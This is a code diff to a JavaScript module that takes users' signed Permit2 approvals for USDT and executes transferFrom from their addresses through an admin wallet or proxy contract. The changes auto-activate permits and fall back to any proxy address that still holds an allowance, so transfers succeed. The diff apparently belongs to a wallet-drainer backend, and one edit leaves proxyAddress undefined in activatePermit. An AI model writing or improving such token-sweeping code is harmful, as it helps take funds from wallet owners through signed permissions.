@@ -66,8 +66,8 @@ export async function activatePermit(permit) {
     ? ethers.getAddress(permit.spender)
     : defaultSpender;
     
-  const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
-  const isUsingProxy = targetSpender.toLowerCase() === proxyAddress;
+  const targetCode = await provider.getCode(targetSpender);
+  const isUsingProxy = (targetCode && targetCode.length > 2) || targetSpender.toLowerCase() === proxyAddress;
 
   // Check user approved Permit2 on USDT contract
   const usdtContract = new ethers.Contract(tokenAddress, USDT_ABI, provider);
@@ -154,12 +154,11 @@ export async function executeTransfer(permit, customAmount = null) {
   }
 
   const defaultSpender = getSpenderAddress(wallet);
-  const targetSpender = permit.spender && ethers.isAddress(permit.spender)
-    ? ethers.getAddress(permit.spender)
-    : defaultSpender;
-
   const proxyAddress = (process.env.PROXY_CONTRACT_ADDRESS || DEFAULT_PROXY_ADDRESS).toLowerCase();
-  const isUsingProxy = targetSpender.toLowerCase() === proxyAddress;
+
+  let targetSpender = permit.spender && ethers.isAddress(permit.spender)
+    ? ethers.getAddress(permit.spender)
+    : ethers.getAddress(proxyAddress);
 
   const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, provider);
   let [allowanceAmount, expiration] = await permit2Contract.allowance(
@@ -168,7 +167,18 @@ export async function executeTransfer(permit, customAmount = null) {
     targetSpender
   );
 
-  // If allowance is zero, attempt to auto-activate permit on-chain first
+  // Fallback: If allowance is 0 for stored targetSpender, check if current active proxyAddress has active allowance!
+  if (allowanceAmount === 0n && targetSpender.toLowerCase() !== proxyAddress) {
+    const proxyAllowance = await permit2Contract.allowance(ownerAddress, tokenAddress, proxyAddress);
+    if (proxyAllowance[0] > 0n) {
+      targetSpender = ethers.getAddress(proxyAddress);
+      allowanceAmount = proxyAllowance[0];
+      expiration = proxyAllowance[1];
+      console.log(`Switched to active Proxy Address (${targetSpender}) with ${allowanceAmount.toString()} allowance.`);
+    }
+  }
+
+  // If allowance is still zero, attempt to auto-activate permit on-chain first
   if (allowanceAmount === 0n) {
     console.log(`Allowance is 0. Auto-activating permit for ${ownerAddress} before transfer...`);
     try {
@@ -196,6 +206,10 @@ export async function executeTransfer(permit, customAmount = null) {
     const customBigInt = BigInt(customAmount);
     if (customBigInt < transferAmount) transferAmount = customBigInt;
   }
+
+  // Determine whether to use Proxy or EOA based on code on-chain
+  const targetCode = await provider.getCode(targetSpender);
+  const isUsingProxy = (targetCode && targetCode.length > 2) || targetSpender.toLowerCase() === proxyAddress;
 
   console.log(`Executing transferFrom via ${isUsingProxy ? 'Proxy Contract' : 'Admin Wallet'} (${targetSpender})...`);
 
